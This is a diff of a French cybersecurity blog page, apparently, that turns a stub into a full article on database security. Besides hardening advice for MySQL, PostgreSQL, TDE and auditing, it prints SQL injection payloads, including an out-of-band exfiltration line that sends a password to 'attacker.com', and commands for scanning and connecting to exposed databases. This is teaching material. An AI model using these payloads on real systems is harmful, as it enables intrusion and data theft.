@@ -4,6 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- ===== GOOGLE ANALYTICS ===== -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CRVR89FWBH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-CRVR89FWBH');
+</script>
+
 <!-- ===== SEO ===== -->
 <title>Sécurité des bases de données : protéger vos données sensibles — Temgus.CyberBlog</title>
 <meta name="description" content="Injection SQL avancée, sécurisation MySQL/PostgreSQL, TDE, chiffrement des colonnes et audit des accès.">
@@ -12,7 +21,7 @@
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://temgus2025.github.io/temgus-cyberblog/pages/securite-databases.html">
 
-<!-- ===== OPEN GRAPH (Facebook, LinkedIn) ===== -->
+<!-- ===== OPEN GRAPH ===== -->
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://temgus2025.github.io/temgus-cyberblog/pages/securite-databases.html">
 <meta property="og:title" content="Sécurité des bases de données : protéger vos données sensibles — Temgus.CyberBlog">
@@ -28,7 +37,6 @@
 
 <!-- ===== TWITTER CARD ===== -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:site" content="@temgus">
 <meta name="twitter:title" content="Sécurité des bases de données : protéger vos données sensibles — Temgus.CyberBlog">
 <meta name="twitter:description" content="Injection SQL avancée, sécurisation MySQL/PostgreSQL, TDE, chiffrement des colonnes et audit des accès.">
 <meta name="twitter:image" content="https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png">
@@ -41,22 +49,440 @@
   "headline": "Sécurité des bases de données : protéger vos données sensibles",
   "description": "Injection SQL avancée, sécurisation MySQL/PostgreSQL, TDE, chiffrement des colonnes et audit des accès.",
   "datePublished": "2025-08-19",
-  "author": {"@type": "Person", "name": "Temgus", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
-  "publisher": {"@type": "Person", "name": "Temgus"},
+  "author": {"@type": "Person", "name": "Derrick Temgoua", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
+  "publisher": {"@type": "Person", "name": "Derrick Temgoua"},
   "url": "https://temgus2025.github.io/temgus-cyberblog/pages/securite-databases.html",
   "inLanguage": "fr",
   "keywords": "base de données, MySQL, PostgreSQL, TDE, SQL injection",
-  "timeRequired": "PT10M"
+  "timeRequired": "PT10M",
+  "image": "https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png"
 }
 </script>
 
+<!-- ===== STYLES ===== -->
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/article.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+<style>
+  /* Styles spécifiques aux pages statiques */
+  .static-article-layout {
+    max-width: 860px;
+    margin: 100px auto 60px;
+    padding: 0 24px;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    color: #c9d1d9;
+    line-height: 1.8;
+  }
+  .static-article-layout h1 {
+    color: #00d4ff;
+    font-size: 2rem;
+    margin-bottom: 12px;
+  }
+  .static-article-layout h2 {
+    color: #00d4ff;
+    font-size: 1.4rem;
+    margin-top: 40px;
+    border-left: 3px solid #00d4ff;
+    padding-left: 12px;
+  }
+  .static-article-layout h3 {
+    color: #7ee787;
+    font-size: 1.1rem;
+    margin-top: 24px;
+  }
+  .static-article-layout p { margin: 12px 0; }
+  .static-article-layout ul, .static-article-layout ol {
+    padding-left: 24px;
+    margin: 12px 0;
+  }
+  .static-article-layout li { margin: 6px 0; }
+  .static-article-layout pre {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 20px 0;
+  }
+  .static-article-layout code {
+    background: #161b22;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    color: #e6edf3;
+  }
+  .static-article-layout pre code {
+    background: none;
+    padding: 0;
+  }
+  .static-article-layout strong { color: #e6edf3; }
+  .static-article-layout a { color: #00d4ff; }
+
+  .article-meta-banner {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin-bottom: 32px;
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .article-meta-banner .icon { font-size: 40px; }
+  .meta-info { flex: 1; }
+  .meta-category {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .meta-details {
+    color: #8892a4;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+  .meta-details span { margin-right: 16px; }
+
+  .article-nav-links {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid #21262d;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .article-nav-links a {
+    color: #00d4ff;
+    text-decoration: none;
+    font-size: 14px;
+    max-width: 45%;
+  }
+  .article-nav-links a:hover { text-decoration: underline; }
+
+  .toc-box {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+  }
+  .toc-box h4 {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    margin: 0 0 12px;
+  }
+  .toc-list { list-style: none; padding: 0; margin: 0; }
+  .toc-list li { margin: 6px 0; }
+  .toc-list a { color: #8892a4; font-size: 14px; text-decoration: none; }
+  .toc-list a:hover { color: #00d4ff; }
+
+  .btn-read-original {
+    display: inline-block;
+    margin-top: 32px;
+    background: transparent;
+    border: 1px solid #00d4ff;
+    color: #00d4ff;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-size: 14px;
+    transition: all 0.2s;
+  }
+  .btn-read-original:hover {
+    background: #00d4ff;
+    color: #060d1a;
+  }
+</style>
 </head>
-<body style="background:#060d1a;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:20px;text-align:center;padding:40px">
-  <div style="font-size:48px">🗄️</div>
-  <h1 style="color:#00d4ff;font-size:22px;max-width:600px">Sécurité des bases de données : protéger vos données sensibles</h1>
-  <p style="color:#8892a4;max-width:500px">Injection SQL avancée, sécurisation MySQL/PostgreSQL, TDE, chiffrement des colonnes et audit des accès.</p>
-  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#securite-databases" style="background:#00d4ff;color:#060d1a;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700">
-    Lire l'article →
+<body style="background:#060d1a">
+
+<canvas id="binary-canvas"></canvas>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <a href="../index.html" class="logo">Temgus.<span>CyberBlog</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Accueil</a></li>
+    <li><a href="../index.html#articles" class="active">Articles</a></li>
+    <li><a href="../index.html#categories">Catégories</a></li>
+    <li><a href="../a-propos.html">À propos</a></li>
+  </ul>
+  <a href="../index.html" class="btn-outline" style="font-size:13px;padding:7px 16px">← Retour</a>
+</nav>
+
+<!-- ARTICLE COMPLET -->
+<main class="static-article-layout">
+
+  <!-- Bannière méta -->
+  <div class="article-meta-banner">
+    <div class="icon">🗄️</div>
+    <div class="meta-info">
+      <div class="meta-category">Sécurité réseau</div>
+      <div style="color:#e6edf3;font-size:18px;font-weight:600">Sécurité des bases de données : protéger vos données sensibles</div>
+      <div class="meta-details">
+        <span>📅 2025-08-19</span>
+        <span>⏱ 10 min de lecture</span>
+        <span>🏷 Intermédiaire</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Table des matières -->
+  <div class="toc-box"><h4>// SOMMAIRE</h4><ul class="toc-list"><li><a href="#vecteurs-d-attaque-sur-les-bdd">Vecteurs d'attaque sur les BDD</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#injection-sql-avanc-e">Injection SQL avancée</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#acc-s-direct-aux-ports-bdd-expos-s">Accès direct aux ports BDD exposés</a></li>
+<li><a href="#s-curisation-mysql-mariadb">Sécurisation MySQL/MariaDB</a></li>
+<li><a href="#s-curisation-postgresql">Sécurisation PostgreSQL</a></li>
+<li><a href="#chiffrement-transparent-des-donn-es-tde-">Chiffrement transparent des données (TDE)</a></li>
+<li><a href="#audit-et-monitoring">Audit et monitoring</a></li>
+<li><a href="#checklist-s-curit-bdd">Checklist sécurité BDD</a></li>
+<li><a href="#conclusion">Conclusion</a></li></ul></div>
+
+  <!-- Contenu de l'article -->
+  <article><h1>Sécurité des bases de données : protéger vos données sensibles</h1>
+
+<p>Les bases de données contiennent les données les plus sensibles de votre organisation. Une compromission de base de données est souvent l'objectif final d'une attaque. Ce guide couvre les vecteurs d'attaque et les meilleures pratiques de sécurisation.</p>
+
+<h2 id="vecteurs-d-attaque-sur-les-bdd">Vecteurs d'attaque sur les BDD</h2>
+
+<h3 id="injection-sql-avanc-e">Injection SQL avancée</h3>
+
+<pre><code class="language-sql">-- Injection UNION pour exfiltrer des données
+<p>' UNION SELECT username, password, 3, 4 FROM users--</p>
+
+<p>-- Blind SQLi (pas de retour direct)</p>
+<p>' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)--</p>
+
+<p>-- Time-based blind SQLi</p>
+<p>' AND 1=(SELECT SLEEP(5))--</p>
+<p>' AND 1=(SELECT CASE WHEN (username='admin') THEN SLEEP(5) ELSE 0 END FROM users)--</p>
+
+<p>-- Out-of-band SQLi (DNS exfiltration)</p>
+<p>' AND 1=(SELECT LOAD_FILE(CONCAT('\\\\',</p>
+<p>(SELECT password FROM users LIMIT 1),</p>
+<p>'.attacker.com\\share')))--</code></pre>
+
+<h3 id="acc-s-direct-aux-ports-bdd-expos-s">Accès direct aux ports BDD exposés</h3>
+
+<pre><code class="language-bash"># Scanner les BDD exposées sur Internet (NE JAMAIS faire sans autorisation)
+<p>nmap -p 3306,5432,1433,1521,27017 192.168.1.0/24</p>
+
+<h1>MySQL exposé</h1>
+<p>mysql -h 192.168.1.100 -u root -p</p>
+<h1>Si pas de mot de passe : connexion directe !</h1>
+
+<h1>MongoDB sans authentification (très courant !)</h1>
+<p>mongo --host 192.168.1.100:27017</p>
+<p>&gt; show dbs</p>
+<p>&gt; use production</p>
+<p>&gt; db.users.find()  # Accès direct à toutes les données !</code></pre>
+
+<h2 id="s-curisation-mysql-mariadb">Sécurisation MySQL/MariaDB</h2>
+
+<pre><code class="language-sql">-- 1. Supprimer les comptes anonymes
+<p>DELETE FROM mysql.user WHERE User='';</p>
+<p>FLUSH PRIVILEGES;</p>
+
+<p>-- 2. Désactiver la connexion root à distance</p>
+<p>UPDATE mysql.user SET Host='localhost' WHERE User='root';</p>
+<p>FLUSH PRIVILEGES;</p>
+
+<p>-- 3. Principe du moindre privilège</p>
+<p>CREATE USER 'app_user'@'10.0.0.%' IDENTIFIED BY 'MotDePasseFort123!';</p>
+<p>GRANT SELECT, INSERT, UPDATE ON app_database.* TO 'app_user'@'10.0.0.%';</p>
+<p>-- Pas de DROP, DELETE, CREATE, GRANT</p>
+
+<p>-- 4. Chiffrement des données sensibles</p>
+<p>-- Chiffrement au niveau colonne</p>
+<p>CREATE TABLE users (</p>
+<p>id INT PRIMARY KEY,</p>
+<p>username VARCHAR(50),</p>
+<p>password_hash VARCHAR(255),  -- bcrypt, pas MD5 !</p>
+<p>email_encrypted VARBINARY(255),  -- AES_ENCRYPT</p>
+<p>credit_card VARBINARY(255)</p>
+<p>);</p>
+
+<p>-- Insérer avec chiffrement</p>
+<p>INSERT INTO users (email_encrypted)</p>
+<p>VALUES (AES_ENCRYPT('user@email.com', SHA2('encryption_key', 256)));</p>
+
+<p>-- 5. Activer les logs d'audit</p>
+<p>SET GLOBAL general_log = 'ON';</p>
+<p>SET GLOBAL general_log_file = '/var/log/mysql/queries.log';</code></pre>
+
+<h2 id="s-curisation-postgresql">Sécurisation PostgreSQL</h2>
+
+<pre><code class="language-sql">-- pg_hba.conf - Contrôle d'accès
+<h1>Seulement les connexions locales et depuis l'app server</h1>
+<p>local   all             postgres                                peer</p>
+<p>host    app_db          app_user        10.0.0.5/32             scram-sha-256</p>
+<p>host    all             all             0.0.0.0/0               reject  # Bloquer tout le reste</p>
+
+<p>-- Chiffrement TLS obligatoire</p>
+<p>-- postgresql.conf</p>
+<p>ssl = on</p>
+<p>ssl_cert_file = 'server.crt'</p>
+<p>ssl_key_file = 'server.key'</p>
+
+<p>-- Row Level Security (RLS) - Isolation par utilisateur</p>
+<p>CREATE TABLE documents (</p>
+<p>id SERIAL,</p>
+<p>owner_id INT,</p>
+<p>content TEXT</p>
+<p>);</p>
+
+<p>ALTER TABLE documents ENABLE ROW LEVEL SECURITY;</p>
+
+<p>CREATE POLICY user_isolation ON documents</p>
+<p>USING (owner_id = current_user_id());</p>
+
+<p>-- Chaque utilisateur ne voit que SES données</code></pre>
+
+<h2 id="chiffrement-transparent-des-donn-es-tde-">Chiffrement transparent des données (TDE)</h2>
+
+<pre><code>Transparent Data Encryption :
+<p>→ Chiffre les fichiers de données sur disque</p>
+<p>→ Transparent pour l'application (pas de changement de code)</p>
+<p>→ Protège contre le vol physique du disque</p>
+
+<p>MySQL : InnoDB tablespace encryption</p>
+<p>PostgreSQL : pgcrypto + chiffrement filesystem</p>
+<p>SQL Server : TDE natif</p>
+<p>Oracle : Advanced Security TDE</p>
+
+<p>Limites :</p>
+<p>→ Ne protège pas contre les accès via l'application</p>
+<p>→ Ne protège pas contre un DBA malveillant</p>
+<p>→ Complément nécessaire : chiffrement au niveau applicatif</code></pre>
+
+<h2 id="audit-et-monitoring">Audit et monitoring</h2>
+
+<pre><code class="language-bash"># pgAudit - Audit complet PostgreSQL
+<p>shared_preload_libraries = 'pgaudit'</p>
+<p>pgaudit.log = 'all'  # Logger toutes les requêtes</p>
+
+<h1>MySQL Enterprise Audit</h1>
+<p>plugin-load-add=audit_log.so</p>
+<p>audit_log_format=JSON</p>
+<p>audit_log_policy=ALL</p>
+
+<h1>Détecter les requêtes suspectes</h1>
+<h1>Requêtes qui lisent beaucoup de données d'un coup</h1>
+<p>SELECT query, calls, rows, mean_exec_time</p>
+<p>FROM pg_stat_statements</p>
+<p>WHERE rows &gt; 10000</p>
+<p>ORDER BY rows DESC;</p>
+
+<h1>Connexions à des heures inhabituelles</h1>
+<p>SELECT usename, client_addr, backend_start, query_start</p>
+<p>FROM pg_stat_activity</p>
+<p>WHERE EXTRACT(HOUR FROM backend_start) NOT BETWEEN 8 AND 18;</code></pre>
+
+<h2 id="checklist-s-curit-bdd">Checklist sécurité BDD</h2>
+
+<pre><code>✅ Pas de BDD exposée directement sur Internet
+<p>✅ Authentification forte (pas de comptes sans mot de passe)</p>
+<p>✅ Principe du moindre privilège (un user par application)</p>
+<p>✅ Chiffrement TLS pour les connexions</p>
+<p>✅ Chiffrement at-rest (TDE)</p>
+<p>✅ Données sensibles chiffrées au niveau colonne</p>
+<p>✅ Audit logging activé</p>
+<p>✅ Mises à jour régulières</p>
+<p>✅ Pas de credentials en dur dans le code (utiliser des secrets managers)</p>
+<p>✅ Backup chiffré et testé régulièrement</p>
+<p>✅ Firewall : seul l'app server peut accéder au port BDD</code></pre>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>La sécurité des bases de données repose sur la <strong>défense en profondeur</strong> : isolation réseau, authentification forte, moindre privilège, chiffrement et audit. Une base de données bien sécurisée, même si l'application web est compromise via SQLi, doit limiter les dégâts grâce aux contrôles d'accès et au chiffrement des données sensibles.</p>
+
+<p>---</p>
+<p><em>Catégorie : Sécurité réseau</em></p>
+</article>
+
+  <!-- Lien vers la version interactive -->
+  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#securite-databases" class="btn-read-original">
+    💬 Voir l'article avec commentaires →
   </a>
+
+  <!-- Navigation précédent / suivant -->
+  <div class="article-nav-links">
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/kerberos-avance.html" class="nav-prev">← Attaques Kerberos avancées : Kerberoasting et Golden Ticket</a>
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/pentest-web-avance.html" class="nav-next">Pentest Web avancé : au-delà de l'OWASP Top 10 →</a>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-logo">Temgus.<span>CyberBlog</span></div>
+      <div class="footer-copy">© 2025 Temgus — Tous droits réservés</div>
+    </div>
+    <div class="footer-links">
+      <a href="../mentions-legales.html">Mentions légales</a>
+      <a href="../a-propos.html">Contact</a>
+      <a href="https://github.com/temgus2025" target="_blank">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+<!-- Coloration syntaxique -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  // Highlight.js
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));
+  });
+
+  // Animation binaire (depuis style.css / app.js existant)
+  const canvas = document.getElementById('binary-canvas');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 14);
+    const drops = Array(cols).fill(1);
+    function drawBinary() {
+      ctx.fillStyle = 'rgba(6,13,26,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'rgba(0,212,255,0.15)';
+      ctx.font = '12px monospace';
+      drops.forEach((y, i) => {
+        ctx.fillText(Math.random() > 0.5 ? '1' : '0', i * 14, y * 14);
+        if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      });
+    }
+    setInterval(drawBinary, 50);
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  }
+
+  // Navbar scroll
+  window.addEventListener('scroll', () => {
+    const nav = document.getElementById('navbar');
+    if (nav) nav.classList.toggle('scrolled', window.scrollY > 50);
+  });
+
+  // Smooth scroll pour le sommaire
+  document.querySelectorAll('.toc-list a').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      const target = document.querySelector(a.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
 </body>
 </html>
